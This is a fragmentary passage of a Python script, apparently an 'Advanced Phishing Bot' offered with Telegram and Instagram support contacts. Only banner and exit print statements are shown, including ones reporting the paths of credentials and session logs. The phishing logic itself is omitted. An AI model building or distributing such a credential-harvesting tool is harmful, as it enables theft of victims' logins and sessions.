...
print(f"{RED}{BOLD}𝗫 𝗔𝗗𝗩𝗔𝗡𝗖𝗘𝗗 𝗣𝗛𝗜𝗦𝗛𝗜𝗡𝗚 𝗕𝗢𝗧{END}")
print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")
...
📞 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗦𝘂𝗽𝗽𝗼𝗿𝘁:
• 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺: @dark_exploi_t
• instagram: dark_exploit_
...
try:
    ...
    print(f"{CYAN}📁 𝗖𝗿𝗲𝗱𝗲𝗻𝘁𝗶𝗮𝗹𝘀 𝗹𝗼𝗴: {credentials_log}{END}")
    print(f"{CYAN}📁 𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀 𝗹𝗼𝗴: {session_log}{END}")
    print(f"{YELLOW}👨‍💻 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: @DARK{END}")
    print(f"{YELLOW}📢 Admin: AMIT{END}")
    print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")
    sys.exit(0)
